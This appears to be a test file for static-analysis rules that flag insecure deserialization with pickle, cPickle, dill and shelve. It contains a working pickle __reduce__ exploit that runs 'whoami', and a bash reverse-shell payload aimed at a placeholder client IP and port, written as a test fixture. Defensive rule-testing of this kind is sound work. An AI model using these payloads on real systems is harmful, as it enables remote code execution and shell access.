# Import dependencies
import os
import _pickle

# Attacker prepares exploit that application will insecurely deserialize
class Exploit(object):
    def __reduce__(self):
        return (os.system, ("whoami",))


# Attacker serializes the exploit
def serialize_exploit():
    # ruleid: avoid-pickle
    shellcode = _pickle.dumps(Exploit())
    return shellcode


# Application insecurely deserializes the attacker's serialized data
def insecure_deserialization(exploit_code):
    # todok: avoid-pickle
    # _pickle.loads(exploit_code)

    # ruleid: avoid-pickle
    _pickle.loads(exploit_code)


# Application insecurely deserializes the attacker's serialized data
def insecure_deserialization_2(exploit_code):
    import _pickle as adaasfa

    # ruleid: avoid-pickle
    adaasfa.loads(exploit_code)


import socket
import cPickle

class Shell_code(object):
    def __reduce__(self):
        return (
            os.system,
            ('/bin/bash -i >& /dev/tcp/"Client IP"/"Listening PORT" 0>&1',),
        )


# ruleid: avoid-cPickle
shell = cPickle.dumps(Shell_code())

import dill
import dill as securedill

import dill as pickle
from dill import load, loads

from http.server import BaseHTTPRequestHandler
import urllib.parse

class GetHandler(BaseHTTPRequestHandler):

    def do_GET(self):
        tainted = urlparse.urlparse(self.path).query
        
        # ruleid: avoid-dill
        dill.load(tainted)
        # ruleid: avoid-dill
        dill.loads(tainted)
        # ruleid: avoid-dill
        dill.load_module(filename=tainted)
        # ruleid: avoid-dill
        dill.load_module_asdict(filename=tainted)
        # ruleid: avoid-dill
        dill.temp.load(tainted)
        # ruleid: avoid-dill
        dill.temp.loadIO(tainted)
        # ruleid: avoid-dill
        dill.temp.load_source(tainted)
        # ruleid: avoid-dill
        dill.temp.loadIO_source(tainted)

        # ruleid: avoid-dill
        unpickler = dill.Unpickler(tainted)
        unpickler.load()

        # ok: avoid-dill
        dill.load(s)
        # ok: avoid-dill
        dill.loads(b)
        # ok: avoid-dill
        dill.load_module(filename=s)
        # ok: avoid-dill
        dill.load_module_asdict(filename=s)
        # ok: avoid-dill
        dill.temp.load(s)
        # ok: avoid-dill
        dill.temp.loadIO(s)
        # ok: avoid-dill
        dill.temp.load_source(s)
        # ok: avoid-dill
        dill.temp.loadIO_source(s)

        # ok: avoid-dill
        unpickler = dill.Unpickler(s)
        unpickler.load()

        # ruleid: avoid-dill
        pickle.load(tainted)
        # ruleid: avoid-dill
        pickle.loads(tainted)
        # ruleid: avoid-dill
        pickle.load_module(filename=tainted)
        # ruleid: avoid-dill
        pickle.load_module_asdict(filename=tainted)
        # ruleid: avoid-dill
        pickle.temp.load(tainted)
        # ruleid: avoid-dill
        pickle.temp.loadIO(tainted)
        # ruleid: avoid-dill
        pickle.temp.load_source(tainted)
        # ruleid: avoid-dill
        pickle.temp.loadIO_source(tainted)

        # ruleid: avoid-dill
        unpickler = pickle.Unpickler(tainted)
        unpickler.load()

        # ok: avoid-dill
        pickle.load(s)
        # ok: avoid-dill
        pickle.loads(b)
        # ok: avoid-dill
        pickle.load_module(filename=s)
        # ok: avoid-dill
        pickle.load_module_asdict(filename=s)
        # ok: avoid-dill
        pickle.temp.load(s)
        # ok: avoid-dill
        pickle.temp.loadIO(s)
        # ok: avoid-dill
        pickle.temp.load_source(s)
        # ok: avoid-dill
        pickle.temp.loadIO_source(s)

        # ok: avoid-dill
        unpickler = pickle.Unpickler(s)
        unpickler.load()

        
        # ruleid: avoid-dill
        securedill.load(tainted)
        # ruleid: avoid-dill
        securedill.loads(tainted)
        # ruleid: avoid-dill
        securedill.load_module(filename=tainted)
        # ruleid: avoid-dill
        securedill.load_module_asdict(filename=tainted)
        # ruleid: avoid-dill
        securedill.temp.load(tainted)
        # ruleid: avoid-dill
        securedill.temp.loadIO(tainted)
        # ruleid: avoid-dill
        securedill.temp.load_source(tainted)
        # ruleid: avoid-dill
        securedill.temp.loadIO_source(tainted)

        # ruleid: avoid-dill
        unpickler = securedill.Unpickler(tainted)
        unpickler.load()

        # ok: avoid-dill
        securedill.load(s)
        # ok: avoid-dill
        securedill.loads(b)
        # ok: avoid-dill
        securedill.load_module(filename=s)
        # ok: avoid-dill
        securedill.load_module_asdict(filename=s)
        # ok: avoid-dill
        securedill.temp.load(s)
        # ok: avoid-dill
        securedill.temp.loadIO(s)
        # ok: avoid-dill
        securedill.temp.load_source(s)
        # ok: avoid-dill
        securedill.temp.loadIO_source(s)

        # ok: avoid-dill
        unpickler = securedill.Unpickler(s)
        unpickler.load()

        # ruleid: avoid-dill
        load(tainted)
        # ruleid: avoid-dill
        loads(tainted)

        # ok: avoid-dill
        load(s)
        # ok: avoid-dill
        loads(b)

import shelve

# ruleid: avoid-shelve
myShelve = shelve.open(Shell_code())

if __name__ == "__main__":
    # Serialize the exploit
    shellcode = serialize_exploit()

    # Attacker's payload runs a `whoami` command
    insecure_deserialization(shellcode)
